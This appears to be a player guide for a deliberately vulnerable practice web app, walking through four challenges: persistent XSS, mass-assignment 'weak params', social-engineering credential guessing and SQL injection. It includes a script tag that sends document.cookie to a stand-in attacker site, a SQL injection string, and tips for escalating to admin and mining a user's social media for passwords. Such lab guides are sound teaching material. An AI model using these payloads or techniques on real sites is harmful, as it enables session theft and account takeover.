The first example of an attack is the Persistent Cross Site Scripting attack (XSS). This is allows the attacker to insert a JS   <Script> tag into a form. When the browser renders the html in the public post, the browser will automatically execute the JS. 

For example, if you were to type
   <script> window.location= 'http://www.someattacksite.com/?cookie='+       
   	document.cookie </script>

The browser will render the message, send the user to the attack page, and will steal their cookie for that site. Normally, one cannot steal a users cookie, but since the original site has been the one to redirect, the browser considers it to be an original part of the site.



******************************************

Weak Params is the next vector possible. This occurs when the URL route does not specify the parameters that it will accept. For instance, you could copy and paste a user acount number and access another person's account or delete certain files if those features are available.

For this exercise, you are able to edit the html form when signing up as a new user. All you have to do is Inspect Element on the form, edit the form, and add yourself as an admin.

********************************************

Social Engineering is just straight creepy. You get to peruse the Twitter site linked looking for clues as to the User's possible credentials. People have a very bad habit of reusing the same passwords  for different sites.

Look at Bob's Username in the Hackkit User list. I think you can go from there.

********************************************

The final attack is a SQL injection. This attack is performed by slipping extra SQL commands into the methods of querying the database. The way through this challenge is to type the following, or something similar, into the Post search form. Voila! Anarchy!

'; Select * From Posts; --


Thanks for playing with my project! Leave me feedback on Github. My username is sbsample.